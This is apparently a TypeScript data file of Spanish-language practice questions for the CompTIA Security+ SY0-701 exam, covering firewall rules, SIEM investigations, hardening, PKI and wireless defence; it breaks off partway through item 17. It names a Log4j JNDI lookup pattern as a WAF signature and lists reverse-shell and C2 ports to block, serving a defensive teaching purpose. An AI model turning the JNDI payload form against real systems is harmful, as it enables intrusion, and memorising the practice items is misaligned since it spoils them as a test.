/**
 * CompTIA Security+ (SY0-701) PBQ Data Engine
 * 
 * Contiene 14 casos de estudio prácticos que cubren todos los dominios de CompTIA SY0-701:
 * PBQ 1: Perímetro Seguro y Micro-Segmentación (Network)
 * PBQ 2: Endurecimiento de Reglas Firewall Inbound (Firewall ACL)
 * PBQ 3: Análisis de Logs SIEM Paciente Cero (SIEM Log)
 * PBQ 4: Endurecimiento de Servidor Web y Líneas Base (Endpoint Hardening)
 * PBQ 5: Resolución de Conflicto de Permisos NTFS (IAM Permissions)
 * PBQ 6: Criptografía Sitio a Sitio IPSec y Datos en Reposo (Crypto & VPN)
 * PBQ 7: Despliegue Wi-Fi WPA3 Enterprise 802.1X (Wireless AP)
 * PBQ 8: Arquitectura Híbrida Cloud (AWS/Azure) y Zero Trust (Network)
 * PBQ 9: Mitigación de Exfiltración y Filtrado Egress (Firewall ACL)
 * PBQ 10: Phishing, C2 DGA Beaconing y Ataque Kerberos (SIEM Log)
 * PBQ 11: Endurecimiento de Estación de Trabajo (VBA, Credential Guard, LLMNR) (Endpoint Hardening)
 * PBQ 12: Políticas de Acceso Condicional y Zero Trust (IAM)
 * PBQ 13: Diagnóstico de Cadena de Certificados PKI y Web TLS (Crypto / PKI)
 * PBQ 14: Detección y Mitigación de Rogue AP y Evil Twin (WIPS Wireless)
 */

import {
  PBQItem,
  NetworkControlItem,
  NetworkZoneSlot,
  FirewallRule,
  FirewallPacketTest,
  SiemLogEntry,
  SiemQuestionsConfig,
  ServiceItem,
  SecurityPolicyItem,
  FolderPermissionNode,
  IamUserGroupConfig,
  ConditionalAccessState,
  CryptoConfigState,
  PkiCertConfigState,
  WirelessApConfigState,
  WipsRogueApConfigState,
  VulnerabilityFinding,
  DlpPolicyItem,
  IncidentResponseActionItem,
  ContainerHardeningState,
  PhysicalSecurityState,
  DisasterRecoveryState,
  SocialEngineeringCase,
  ForensicVerificationState,
  RiskManagementState,
  EmailSecurityState,
  SecurityCliScenario,
  IdsYaraState,
  DevSecOpsState,
  CryptoAttackCase,
  FederationState,
  MobileSecurityState,
  PortAuditItem,
  NmapScanState,
  DnsSecurityState,
  ZeroTrustState,
  WebServerHardeningState,
  ForensicHoldState,
  PkiLifecycleState,
  WirelessSecurityState,
  CloudDlpState,
  SocialEngState,
  CloudSharedResponsibilityState,
  MitreThreatHuntingState,
  DataGovernanceState,
  PrivacyPetsState,
  MalwareTriageState,
  ApiSecurityState,
  SoarAutomationState,
} from '../types/pbq';

export const PBQ_LIST: PBQItem[] = [
  // PBQ 1
  {
    id: 'pbq-1',
    number: 1,
    category: 'network-diagram',
    categoryTitle: 'Diagramas de Red y Ubicación de Controles',
    title: 'Diseño de Perímetro Seguro y Micro-Segmentación',
    estimatedMinutes: 4,
    domain: 'Dominio 3: Arquitectura de Seguridad',
    sy0701Objective: 'Objetivo 3.2: Dado un escenario, aplicar principios de seguridad para asegurar la infraestructura empresarial. (relacionado: 2.5)',
    scenario:
      'Una empresa de e-commerce requiere reestructurar su topología perimetral. Necesitan exponer públicamente un servidor web accesible vía HTTPS con mitigación de ataques web (Capa 7) e inspección profunda de paquetes, mientras garantizan que su Base de Datos de pagos permanezca estrictamente aislada en la red interna (LAN). La administración de servidores internos solo debe realizarse mediante un punto de salto seguro.',
    requirements: [
      'Coloque el WAF (Web Application Firewall) en la posición adecuada para filtrar tráfico HTTP/HTTPS antes de llegar a los servidores web en la DMZ.',
      'Ubique un IPS en línea (Inline IPS) en el borde para mitigar ataques y anomalías de red en tiempo real.',
      'Separe la zona DMZ de la red interna (LAN) mediante un Firewall Stateful con políticas estrictas.',
      'Posicione la Base de Datos transaccional en la red interna (LAN) segura sin exposición directa a Internet.',
      'Ubique el Bastion Host en el perímetro de administración adecuado para acceso remoto seguro (SSH/RDP).',
      'Sitúe el Servidor RADIUS en la red interna para autenticar usuarios corporativos.'
    ],
    tacticalTip:
      'CyberKraft Tip: Recuerde la diferencia clave entre WAF (Capa 7 para HTTP/HTTPS contra SQLi/XSS) e IPS de Red (Capa 3/4/7 general). El WAF debe inspeccionar el tráfico inmediatamente antes del Web Server o en la DMZ. La base de datos NUNCA debe estar en la DMZ.'
  },
  // PBQ 2
  {
    id: 'pbq-2',
    number: 2,
    category: 'firewall-acl',
    categoryTitle: 'Reglas de Firewall y ACLs',
    title: 'Endurecimiento de Reglas de Firewall Corporativo',
    estimatedMinutes: 5,
    domain: 'Dominio 4: Operaciones de Seguridad',
    sy0701Objective: 'Objetivo 4.5: Dado un escenario, modificar las capacidades empresariales para mejorar la seguridad. (relacionado: 3.2)',
    scenario:
      'Un administrador junior configuró el firewall perimetral corporativo dejando brechas de seguridad críticas y reglas en conflicto. La gerencia de Ciberseguridad le ha ordenado auditar y corregir la tabla de reglas: debe bloquear protocolos inseguros no cifrados, permitir administración remota SSH (Puerto 22) ÚNICAMENTE desde la subred interna autorizada de Admins (10.1.0.0/24), habilitar tráfico seguro hacia la DMZ para HTTPS (443) y DNS (53), y asegurar que la regla implícita de denegación funcione correctamente al final.',
    requirements: [
      'Restrinja el acceso SSH (puerto 22): actualmente está abierto a 0.0.0.0/0 (Internet), lo cual es una vulnerabilidad crítica. Debe limitarse exclusivamente a 10.1.0.0/24.',
      'Corrija el orden de las reglas: cualquier regla de denegación general "Deny Any" colocada al inicio bloqueará el tráfico legítimo posterior antes de ser evaluado (Top-Down execution).',
      'Bloquee tráfico inseguro en texto plano (Telnet puerto 23 o HTTP puerto 80 no redirigido).',
      'Asegure la regla Implícita de Denegación (Implicit Deny Any Any) en la última posición (Regla final).'
    ],
    tacticalTip:
      'CyberKraft Tip: Los firewalls evalúan las reglas secuencialmente de arriba hacia abajo (First-Match principle). Si coloca una regla "DENY ALL" antes de una regla "PERMIT", el tráfico permitido nunca llegará a procesarse. Busque siempre la trampa de 0.0.0.0/0 en puertos administrativos.'
  },
  // PBQ 3
  {
    id: 'pbq-3',
    number: 3,
    category: 'log-siem',
    categoryTitle: 'Análisis de Logs e Identificación de Incidentes',
    title: 'Investigación de Paciente Cero y Cadena de Ataque',
    estimatedMinutes: 5,
    domain: 'Dominio 4: Operaciones de Seguridad',
    sy0701Objective: 'Objetivo 4.9: Dado un escenario, usar fuentes de datos para apoyar una investigación. (relacionado: 2.4)',
    scenario:
      'El equipo del Centro de Operaciones de Seguridad (SOC) ha recibido múltiples alertas de tráfico anómalo en la red corporativa. Se sospecha una intrusión activa. Utilice el visor SIEM para analizar los eventos correlacionados entre el servidor Apache, el Firewall perimetral, los registros de eventos de Windows (Event ID 4624 y 4625) y los registros de Syslog del endpoint.',
    requirements: [
      'Identifique la dirección IP interna del "Paciente Cero" (primer host comprometido que originó el ataque lateral).',
      'Reconstruya la cadena de ataque (Attack Vector) en la secuencia correcta de eventos.',
      'Localice el Timestamp exacto en que se produjo la explotación inicial y ejecución de código malicioso.',
      'Determine la acción táctica prioritaria de contención recomendada según el ciclo de vida de respuesta a incidentes (NIST SP 800-61 / CompTIA).'
    ],
    tacticalTip:
      'CyberKraft Tip: En las PBQs de SIEM, busque patrones en los logs: primero escaneo/inyección (Apache HTTP 200 con cargas sospechosas en URLs), luego ejecución de comandos o descarga de payloads (Syslog/EDR), seguido de intentos repetidos de autenticación (Event ID 4625) y posterior éxito (4624), culminando en barrido de puertos internos como SMB (puerto 445).'
  },
  // PBQ 4
  {
    id: 'pbq-4',
    number: 4,
    category: 'endpoint-hardening',
    categoryTitle: 'Endurecimiento de Endpoints',
    title: 'Aseguramiento de Servidor Web y Líneas Base de Seguridad',
    estimatedMinutes: 4,
    domain: 'Dominio 2: Amenazas, Vulnerabilidades y Mitigaciones',
    sy0701Objective: 'Objetivo 2.5: Explicar el propósito de las técnicas de mitigación usadas para asegurar la empresa. (relacionado: 4.1)',
    scenario:
      'Se ha implementado una nueva máquina virtual con funciones de servidor web crítico en producción. Antes de pasar a producción, el equipo de Auditoría requiere que se apliquen las líneas base de endurecimiento (CIS Benchmarks) según los estándares CompTIA Security+.',
    requirements: [
      'Deshabilite todos los protocolos y servicios obsoletos o inseguros que transmitan credenciales en texto plano (Telnet puerto 23, FTP puerto 21, y SMBv1 susceptible a EternalBlue).',
      'Habilite y verifique los protocolos seguros equivalentes (SSH / SFTP puerto 22, HTTPS puerto 443).',
      'Active el Control de Cuentas de Usuario (UAC - User Account Control) en nivel seguro.',
      'Configure la directiva de contraseñas: longitud mínima forzada a 14 caracteres.',
      'Active la directiva de bloqueo de cuentas tras 5 intentos fallidos para mitigar ataques de fuerza bruta.',
      'Exija Autenticación a Nivel de Red (NLA) para sesiones de Escritorio Remoto (RDP).'
    ],
    tacticalTip:
      'CyberKraft Tip: CompTIA siempre evalúa el reemplazo de protocolos inseguros por seguros: Telnet (23) -> SSH (22); FTP (21) -> SFTP (22) o FTPS (990); HTTP (80) -> HTTPS (443); SMBv1 -> SMBv3. Recuerde que el estándar moderno de longitud de contraseña en SY0-701 es de mínimo 14 caracteres (NIST SP 800-63B).'
  },
  // PBQ 5
  {
    id: 'pbq-5',
    number: 5,
    category: 'iam-permissions',
    categoryTitle: 'IAM, Permisos y Mínimo Privilegio',
    title: 'Resolución de Conflicto de Permisos en Compartición de Archivos',
    estimatedMinutes: 4,
    domain: 'Dominio 4: Operaciones de Seguridad',
    sy0701Objective: 'Objetivo 4.6: Dado un escenario, implementar y mantener la gestión de identidades y accesos. (relacionado: 1.2)',
    scenario:
      'Una auditoría interna descubrió anomalías en los permisos del servidor de archivos corporativo: un auditor sénior del departamento de Finanzas no puede modificar las planillas de auditoría en la carpeta de Finanzas, mientras que un practicante de IT (Intern) tiene asignado Control Total accidental sobre la carpeta confidencial de Nómina y Recursos Humanos (HR). Además, la herencia de permisos está provocando propagación indebida.',
    requirements: [
      'Ajuste la asignación de grupos para que el practicante de IT pertenezca únicamente al grupo IT_Helpdesk y se elimine del grupo HR_Admins.',
      'Deshabilite la herencia en la carpeta "/CorpShares/HR/Payroll_Confidential/" y revoque los accesos de "Domain Users" y "Everyone".',
      'Otorgue al grupo "Finance_Auditors" permiso de Modificar (Modify) en "/CorpShares/Finance/Reports/", respetando el mínimo privilegio (sin otorgar Full Control).',
      'Verifique que la regla de Denegación Explícita o falta de permisos no esté bloqueando injustamente a usuarios legítimos.'
    ],
    tacticalTip:
      'CyberKraft Tip: Recuerde el principio de Least Privilege (Mínimo Privilegio): si un usuario solo necesita leer y actualizar un archivo, otorgue "Modify / Read & Write", NUNCA "Full Control" (ya que Full Control permite tomar posesión y cambiar permisos). Recuerde también que una Denegación Explícita (Explicit Deny) siempre tiene precedencia sobre un Permiso Permitido.'
  },
  // PBQ 6
  {
    id: 'pbq-6',
    number: 6,
    category: 'cryptography-vpn',
    categoryTitle: 'Criptografía y Configuración de VPNs',
    title: 'Conexión Sitio a Sitio IPSec y Cifrado de Datos en Reposo',
    estimatedMinutes: 4,
    domain: 'Dominio 1: Conceptos Generales de Seguridad',
    sy0701Objective: 'Objetivo 1.4: Explicar la importancia de usar soluciones criptográficas apropiadas. (relacionado: 3.3)',
    scenario:
      'La empresa necesita interconectar la Oficina Central con una Sucursal remota mediante un túnel VPN IPSec Sitio a Sitio (Site-to-Site) a través de Internet. El túnel debe cumplir con los estándares criptográficos vigentes de NIST y CompTIA SY0-701, eliminando algoritmos obsoletos o con colisiones conocidas. Adicionalmente, se debe seleccionar el estándar adecuado para cifrar la base de datos interna en reposo (At-Rest) y el protocolo de capa de transporte para el portal web.',
    requirements: [
      'En Fase 1 (IKE SA): Seleccione IKEv2 sobre IKEv1, grupo Diffie-Hellman seguro (Group 14 o superior / ECDH) y evite MD5/SHA-1 en favor de SHA-256/384.',
      'En Fase 2 (IPSec SA): Seleccione ESP (Encapsulating Security Payload) para garantizar confidencialidad e integridad del payload, con suite de cifrado autenticado AES-GCM-256.',
      'Habilite Perfect Forward Secrecy (PFS) para prevenir que el compromiso de una clave futura comprometa sesiones anteriores.',
      'Para Datos en Reposo (Database At-Rest): elija AES-256 sobre algoritmos obsoletos como DES, 3DES o RC4.',
      'Para el portal web de administración: configure TLS 1.3 eliminando SSLv3, TLS 1.0 y TLS 1.1.'
    ],
    tacticalTip:
      'CyberKraft Tip: En CompTIA SY0-701, DES, 3DES, RC4, MD5 y SHA-1 se consideran estrictamente OBSOLETOS / VULNERABLES. Siempre prefiera AES-256 (especialmente modo GCM para cifrado autenticado AEAD), familia SHA-2 (SHA-256 / SHA-512), IKEv2 y TLS 1.3.'
  },
  // PBQ 7
  {
    id: 'pbq-7',
    number: 7,
    category: 'wireless-security',
    categoryTitle: 'Seguridad Inalámbrica (Wireless AP)',
    title: 'Despliegue Wi-Fi Corporativo WPA3 Enterprise',
    estimatedMinutes: 4,
    domain: 'Dominio 4: Operaciones de Seguridad',
    sy0701Objective: 'Objetivo 4.1: Dado un escenario, aplicar técnicas de seguridad comunes a los recursos informáticos. (relacionado: 3.2)',
    scenario:
      'Usted es el ingeniero de seguridad encargado de configurar un punto de acceso (AP) inalámbrico empresarial que servirá a la red corporativa interna. Debe implementar el estándar más seguro disponible (WPA3 Enterprise con autenticación centralizada 802.1X), mitigar ataques de fuerza bruta y ataques de desautenticación, y evitar que dispositivos clientes infectados ataquen a otros clientes en la misma celda Wi-Fi.',
    requirements: [
      'Seleccione el modo de seguridad WPA3-Enterprise (802.1X / EAP) en lugar de claves precompartidas (PSK).',
      'Configure el Servidor RADIUS corporativo: IP 10.0.10.25, Puerto estándar de Autenticación 1812 y la clave compartida (Secret Key).',
      'Seleccione el cifrado robusto de grado militar AES-GCMP-256.',
      'Habilite el Aislamiento de Clientes (Client Isolation) para impedir comunicación directa entre dispositivos inalámbricos.',
      'Desactive por completo WPS (Wi-Fi Protected Setup) por su vulnerabilidad inherente.',
      'Fuerce la activación de Tramas de Gestión Protegidas (802.11w PMF) para mitigar ataques de Deauthentication (desconexión forzada).'
    ],
    tacticalTip:
      'CyberKraft Tip: Para empresas, WPA3-Enterprise utiliza 802.1X con RADIUS (puerto 1812 para Auth, 1813 para Acct). WPA3 hace obligatorio PMF (Protected Management Frames - 802.11w) para evitar que los atacantes envíen paquetes de desautenticación falsificados. WPS debe estar siempre OFF.'
  },

  // ========================================================
  // NUEVAS PBQs AVANZADAS (EXPANSIÓN DE CASOS DE ESTUDIO)
  // ========================================================

  // PBQ 8: Hybrid Cloud & Zero Trust
  {
    id: 'pbq-8',
    number: 8,
    category: 'network-diagram',
    categoryTitle: 'Diagramas de Red y Ubicación de Controles',
    title: 'Arquitectura Híbrida Cloud (AWS/Azure) y Zero Trust Ingress',
    estimatedMinutes: 5,
    domain: 'Dominio 3: Arquitectura de Seguridad',
    sy0701Objective: 'Objetivo 3.1: Comparar y contrastar las implicaciones de seguridad de distintos modelos de arquitectura. (relacionado: 3.2)',
    scenario:
      'Una institución bancaria está migrando microservicios transaccionales hacia una Nube Pública (AWS/Azure VPC) mientras conserva su base de datos principal on-premises en su centro de datos privado. Debes diseñar la arquitectura híbrida aplicando principios Zero Trust: inspección perimetral con Cloud WAF en la entrada de la VPC, broker de acceso ZTNA para DevOps, enrutamiento seguro mediante Transit Gateway y Firewall Next-Gen protegiendo el núcleo local.',
    requirements: [
      'Ubica el Cloud WAF en la entrada pública de la VPC para mitigar ataques de Capa 7 antes de los balanceadores de carga.',
      'Coloca el Transit Gateway como el concentrador central de interconexión cifrada entre la VPC y el centro de datos local.',
      'Sitúa el Broker de Acceso Zero Trust (ZTNA) para acceso granular de administradores a servidores de desarrollo.',
      'Posiciona el Firewall de Nueva Generación (NGFW) en el borde del centro de datos local para inspeccionar el túnel híbrido.',
      'Asegura la federación de identidades colocando el ADFS / IDP en la red interna on-premises protegida.'
    ],
    tacticalTip:
      'CyberKraft Tip: En arquitecturas Cloud Híbridas de CompTIA SY0-701, Transit Gateway centraliza el tráfico este-oeste y norte-sur hacia múltiples VPCs y sedes. ZTNA sustituye a las VPNs tradicionales proporcionando acceso mínimo a aplicaciones específicas sin conceder acceso a toda la red.'
  },

  // PBQ 9: Egress Filtering & Exfiltration Defense
  {
    id: 'pbq-9',
    number: 9,
    category: 'firewall-acl',
    categoryTitle: 'Reglas de Firewall y ACLs',
    title: 'Mitigación de Exfiltración de Datos y Filtrado Egress (Salida)',
    estimatedMinutes: 5,
    domain: 'Dominio 4: Operaciones de Seguridad',
    sy0701Objective: 'Objetivo 4.5: Dado un escenario, modificar las capacidades empresariales para mejorar la seguridad. (relacionado: 2.4)',
    scenario:
      'El equipo de Threat Hunting detectó que un host infectado (10.2.0.88) intentó exfiltrar información confidencial mediante DNS Tunneling hacia un servidor DNS externo no autorizado (198.51.100.200) y abrir una reverse shell por el puerto 4444. Debes auditar las reglas de salida (Egress Filtering) en el Firewall perimetral: bloquear puertos maliciosos conocidos, forzar que todas las consultas DNS (UDP 53) salgan EXCLUSIVAMENTE hacia los servidores DNS internos autorizados (10.0.0.53 y 10.0.0.54) y bloquear tráfico de canales C2 IRC (6667).',
    requirements: [
      'Restringe las consultas DNS UDP 53 salientes: deben permitirse únicamente con destino a los DNS autorizados (10.0.0.53 y 10.0.0.54) y bloquear cualquier intento de consulta a IPs de Internet.',
      'Bloquea puertos de alto riesgo frecuentemente asociados a shells inversas y Command & Control (C2): Puerto 4444 y Puerto 6667 (IRC).',
      'Permite la navegación web legítima saliente cifrada HTTPS (Puerto 443).',
      'Garantiza la regla implícita de denegación (Deny All Egress) en la última línea.'
    ],
    tacticalTip:
      'CyberKraft Tip: El filtrado Egress (salida) es tan vital como el Ingress en SY0-701. Nunca permitas DNS UDP 53 abierto hacia 0.0.0.0/0, pues es el vector número uno de DNS Tunneling y exfiltración encubierta. Solo los DNS corporativos deben consultar a la raíz.'
  },

  // PBQ 10: SIEM - Phishing, C2 Beaconing & Kerberoasting
  {
    id: 'pbq-10',
    number: 10,
    category: 'log-siem',
    categoryTitle: 'Análisis de Logs e Identificación de Incidentes',
    title: 'Investigación de Phishing, Beaconing C2 y Ataque Kerberos',
    estimatedMinutes: 5,
    domain: 'Dominio 4: Operaciones de Seguridad',
    sy0701Objective: 'Objetivo 4.9: Dado un escenario, usar fuentes de datos para apoyar una investigación. (relacionado: 2.4)',
    scenario:
      'Se ha disparado una alarma de criticidad alta en el SIEM. Un empleado del departamento de finanzas recibió un correo malicioso. Registros de Gateway de Correo, Proxy corporativo y Active Directory (Event ID 4769) muestran una intrusión con balizamiento periódico (C2 Beaconing) y una petición anómala de ticket de servicio Kerberos con cifrado débil RC4. Investiga el incidente y toma las medidas de respuesta correspondientes.',
    requirements: [
      'Determina la causa de fallo en el correo en el Gateway (SPF/DKIM/DMARC Spoofing con DMARC=fail).',
      'Identifica el dominio C2 DGA y el intervalo regular de beaconing del malware en el Proxy.',
      'Reconoce la técnica de ataque a Active Directory registrada en el Event ID 4769 (Kerberoasting solicitando TGS con cifrado RC4).',
      'Selecciona la acción inmediata de contención y remediación de credenciales según estándares de CompTIA.'
    ],
    tacticalTip:
      'CyberKraft Tip: En CompTIA SY0-701, el Event ID 4769 de Windows Security con Ticket Options sospechosos y cifrado 0x17 (RC4-HMAC) es la firma definitiva de un ataque Kerberoasting (extracción de tickets TGS para crackear contraseñas de cuentas de servicio offline).'
  },

  // PBQ 11: Workstation Hardening & Credential Guard
  {
    id: 'pbq-11',
    number: 11,
    category: 'endpoint-hardening',
    categoryTitle: 'Endurecimiento de Endpoints',
    title: 'Endurecimiento de Estación de Trabajo (VBA, Credential Guard & LLMNR)',
    estimatedMinutes: 4,
    domain: 'Dominio 2: Amenazas, Vulnerabilidades y Mitigaciones',
    sy0701Objective: 'Objetivo 2.5: Explicar el propósito de las técnicas de mitigación usadas para asegurar la empresa. (relacionado: 4.1)',
    scenario:
      'Tras un ejercicio de Red Team donde los atacantes lograron envenenar resoluciones de nombres en la red local y extraer hashes de memoria LSASS, se te solicita implementar la línea base de endurecimiento de estaciones de trabajo Windows 11 corporativas para mitigar ataques de tipo Responder y robo de credenciales en memoria.',
    requirements: [
      'Deshabilita LLMNR (Link-Local Multicast Name Resolution) y NetBIOS sobre TCP/IP para neutralizar ataques de envenenamiento NBT-NS/LLMNR (Responder).',
      'Habilita Windows Defender Credential Guard con Virtualization-Based Security (VBS) para proteger el proceso LSASS contra Mimikatz.',
      'Configura la directiva de ejecución de scripts de PowerShell en "AllSigned" o "Restricted" para bloquear scripts descargados sin firma.',
      'Bloquea la ejecución de macros de Microsoft Office descargadas de Internet (Mark of the Web - MOTW).',
      'Verifica la activación de Arranque Seguro (Secure Boot UEFI) y cifrado BitLocker con TPM 2.0.'
    ],
    tacticalTip:
      'CyberKraft Tip: LLMNR y NetBIOS son protocolos de broadcast antiguos que transmiten hashes NTLMv2 a la red local cuando falla el DNS. Deshabilitarlos es una de las preguntas de hardening más recurrentes en SY0-701.'
  },

  // PBQ 12: Conditional Access & Zero Trust IAM
  {
    id: 'pbq-12',
    number: 12,
    category: 'iam-permissions',
    categoryTitle: 'IAM, Permisos y Mínimo Privilegio',
    title: 'Políticas de Acceso Condicional (Conditional Access) y Zero Trust',
    estimatedMinutes: 5,
    domain: 'Dominio 4: Operaciones de Seguridad',
    sy0701Objective: 'Objetivo 4.6: Dado un escenario, implementar y mantener la gestión de identidades y accesos. (relacionado: 1.2)',
    scenario:
      'Un proveedor de salud en la nube requiere configurar políticas de Acceso Condicional (Conditional Access) y Zero Trust para empleados que acceden a historiales médicos (EHR). Se debe garantizar cumplimiento HIPAA: forzar MFA resistente a phishing (FIDO2), bloquear accesos desde ubicaciones geográficas de alto riesgo, exigir dispositivos conformes (MDM Compliant) y aplicar acceso Just-In-Time (JIT/PIM) para administradores globales.',
    requirements: [
      'Aplica la directiva de Autenticación Multifactor (MFA) obligatoria basada en estándares resistentes a phishing (FIDO2 / WebAuthn) para todos los accesos fuera de la red corporativa.',
      'Configura Geobloqueo (Named Locations) para denegar el acceso desde países fuera del perímetro operativo autorizado.',
      'Exige que el dispositivo del usuario esté registrado y cumpla las directivas de seguridad (MDM / Compliant Device) para abrir aplicaciones con PII/EHR.',
      'Elimina el acceso permanente de Administrador Global implementando Privileged Identity Management (PIM / Just-In-Time access).'
    ],
    tacticalTip:
      'CyberKraft Tip: En Zero Trust, la identidad y el contexto del dispositivo son los nuevos perímetros. "Never Trust, Always Verify". El MFA tradicional por SMS es vulnerable a SIM Swapping; CompTIA promueve MFA resistente a phishing como FIDO2 / hardware security keys.'
  },

  // PBQ 13: PKI Certificate Chain Diagnostics & Web TLS
  {
    id: 'pbq-13',
    number: 13,
    category: 'cryptography-vpn',
    categoryTitle: 'Criptografía y Configuración de VPNs',
    title: 'Diagnóstico de Errores en Cadena de Certificados PKI y Web TLS',
    estimatedMinutes: 5,
    domain: 'Dominio 1: Conceptos Generales de Seguridad',
    sy0701Objective: 'Objetivo 1.4: Explicar la importancia de usar soluciones criptográficas apropiadas.',
    scenario:
      'Los clientes que ingresan al portal bancario seguro están recibiendo alertas críticas del navegador: "SEC_ERROR_UNKNOWN_ISSUER" y "Certificate Name Mismatch". Al auditar el servidor web, descubres que se utilizó un certificado firmado con algoritmo débil, sin incluir la CA intermedia en el bundle, y omitiendo la extensión SAN (Subject Alternative Name). Corrige la configuración de la PKI y el certificado del servidor.',
    requirements: [
      'Sustituye el algoritmo de firma obsoleto SHA-1 por SHA-256 (SHA-256withRSA o ECDSA).',
      'Incluye la Autoridad de Certificación Intermedia (Intermediate CA) en el bundle del certificado del servidor para completar la cadena de confianza hacia la Root CA.',
      'Agrega los dominios correspondientes en la extensión Subject Alternative Name (SAN: DNS:portal.corp.com, DNS:www.portal.corp.com).',
      'Configura OCSP Stapling (RFC 6066) para validación de revocación rápida y privada sin saturar la CA.',
      'Asegura que el certificado sea emitido por una CA Raíz de Confianza Pública en lugar de un certificado autofirmado para servicios de cara al cliente.'
    ],
    tacticalTip:
      'CyberKraft Tip: Un error clásico de examen: un certificado válido emitido por una CA intermedia causará error de navegador si el servidor web no envía el Intermediate Certificate Bundle. El navegador necesita la cadena completa hasta el Trust Store local.'
  },

  // PBQ 14: Wireless WIPS & Rogue AP / Evil Twin Mitigation
  {
    id: 'pbq-14',
    number: 14,
    category: 'wireless-security',
    categoryTitle: 'Seguridad Inalámbrica (Wireless AP)',
    title: 'Detección y Mitigación de Rogue AP y Ataques Evil Twin (WIPS)',
    estimatedMinutes: 4,
    domain: 'Dominio 2: Amenazas, Vulnerabilidades y Mitigaciones',
    sy0701Objective: 'Objetivo 2.4: Dado un escenario, analizar indicadores de actividad maliciosa. (relacionado: 4.1)',
    scenario:
      'El Sistema de Prevención de Intrusiones Inalámbricas (WIPS) de la sede corporativa ha detectado un Punto de Acceso No Autorizado (Rogue AP / Evil Twin) transmitiendo el mismo SSID corporativo (CORP-STAFF) con una dirección MAC desconocida y señal muy fuerte. Algunos empleados han reportado ventanas de autenticación falsas solicitando sus credenciales de dominio. Debes desplegar las contramedidas inmediatas para mitigar la amenaza.',
    requirements: [
      'Clasifica la amenaza detectada por el WIPS como "Rogue AP / Evil Twin Attack" para iniciar contención.',
      'Activa la contención inalámbrica automática en el WIPS (Wireless Containment enviando tramas de desautenticación dirigidas al Rogue BSSID).',
      'Identifica y ejecuta el bloqueo del puerto del switch Ethernet físico (Port Security / Shutdown) al que está conectado el Rogue AP.',
      'Fuerza en las directivas de red inalámbrica corporativa el protocolo EAP-TLS (autenticación mutua por certificados) para evitar que los clientes se asocien a APs sin certificado válido de la CA corporativa.'
    ],
    tacticalTip:
      'CyberKraft Tip: La diferencia entre Rogue AP y Evil Twin: un Rogue AP es cualquier AP no autorizado conectado a la red; un Evil Twin es un Rogue AP que clona específicamente el SSID y configuración de una red legítima para engañar a usuarios y robar credenciales. EAP-TLS con validación estricta de certificado del servidor previene que los clientes caigan en el engaño.'
  },

  // PBQ 15: Vulnerability Management & CVSS Remediation
  {
    id: 'pbq-15',
    number: 15,
    category: 'vulnerability-management',
    categoryTitle: 'Gestión y Remediación de Vulnerabilidades',
    title: 'Priorización de Vulnerabilidades CVSS v3.1 y Remediación Táctica',
    estimatedMinutes: 5,
    domain: 'Dominio 4: Operaciones de Seguridad',
    sy0701Objective: 'Objetivo 4.3: Explicar las actividades asociadas con la gestión de vulnerabilidades.',
    scenario:
      'El escáner de vulnerabilidades (Nessus/Qualys) ejecutó un análisis autenticado sobre la infraestructura corporativa descubriendo 4 fallos críticos: Log4j RCE (CVSS 10.0), Apache HTTP Path Traversal (CVSS 7.5), SSLv3 POODLE y Suites Débiles en OpenSSH. Como analista de ciberseguridad, debes analizar cada CVE y asignar la acción de remediación técnica y táctica más efectiva para mitigar el riesgo.',
    requirements: [
      'Para Log4j (CVE-2021-44228 - CVSS 10.0): actualiza la biblioteca a la versión parcheada 2.17.1+ y aplica una regla de WAF virtual parcheando patrones ${jndi:ldap/rmi}.',
      'Para Apache Path Traversal (CVE-2021-41773): actualiza el servidor web y fuerza la directiva "Require all denied" en el directorio raíz.',
      'Para SSLv3 POODLE (CVE-2014-3566): deshabilita permanentemente SSLv2/SSLv3 y TLS 1.0, forzando TLS 1.2 o TLS 1.3.',
      'Para OpenSSH Ciphers: restringe sshd_config deshabilitando algoritmos CBC y 3DES, requiriendo exclusivamente cifradores autenticados AEAD.'
    ],
    tacticalTip:
      'CyberKraft Tip: En CompTIA SY0-701, un CVSS Score de 9.0 a 10.0 es CRITICAL y siempre debe ser mitigado en primer lugar. Las mitigaciones temporales como Virtual Patching en WAF se aplican mientras se despliega el parche definitivo en producción.'
  },

  // PBQ 16: DLP & Data Protection in 3 States
  {
    id: 'pbq-16',
    number: 16,
    category: 'dlp-data-protection',
    categoryTitle: 'Protección de Datos y DLP',
    title: 'Clasificación de Información Sensible y Controles DLP en 3 Estados',
    estimatedMinutes: 4,
    domain: 'Dominio 3: Arquitectura de Seguridad',
    sy0701Objective: 'Objetivo 3.3: Comparar y contrastar conceptos y estrategias para proteger los datos. (relacionado: 4.5)',
    scenario:
      'Una empresa farmacéutica almacena fórmulas patentadas, registros médicos (HIPAA/PII) y transacciones de clientes. La auditoría exige proteger estos activos en sus tres estados del ciclo de vida: Datos en Reposo (At-Rest), Datos en Tránsito (In-Transit) y Datos en Uso (In-Use). Asigna los controles de seguridad criptográficos y de prevención de fugas (DLP) idóneos.',
    requirements: [
      'Protege los Datos en Reposo (Base de Datos): implementa cifrado transparente AES-256 (TDE / BitLocker) con gestión de claves en KMS / HSM.',
      'Protege los Datos en Tránsito (APIs y canales de red): fuerza TLS 1.3 con autenticación mutua mTLS y secreto perfecto hacia adelante (PFS).',
      'Protege los Datos en Uso (Estaciones de trabajo): despliega agente Endpoint DLP para bloquear copiado de PII a memorias USB, portapapeles y capturas de pantalla.',
      'Protege los repositorios Cloud / SaaS: activa CASB en modo API con escaneo continuo y marcas de agua digitales.'
    ],
    tacticalTip:
      'CyberKraft Tip: Recuerda los 3 estados fundamentales del dato en SY0-701: At-Rest (almacenado en disco/BD -> Cifrado AES/BitLocker), In-Transit (viajando por la red -> TLS 1.3/IPSec), In-Use (cargado en RAM/pantalla -> Endpoint DLP, enmascaramiento, Confidential Computing).'
  },

  // PBQ 17: Incident Response Playbook Lifecycle
  {
    id: 'pbq-17',
    number: 17,
    category: 'incident-response',
    categoryTitle: 'Respuesta a Incidentes (NIST SP 800-61r2)',
    title: 'Secuencia del Ciclo de Vida de Respuesta a Incidentes NIST',
    estimatedMinutes: 5,
    domain: 'Dominio 4: Operaciones de Seguridad',
    sy0701Objective: 'Objetivo 4.8: Explicar las actividades apropiadas de respuesta a incidentes.',
    scenario:
      'Un ataque de Ransomware ha sido detectado en una estación de finanzas intentando cifrar carpetas compartidas de la red. El equipo CSIRT debe ejecutar el plan de respuesta según el estándar NIST SP 800-61r2. Asigna cada una de las 6 acciones tácticas a la fase oficial que le corresponde.',
    requirements: [
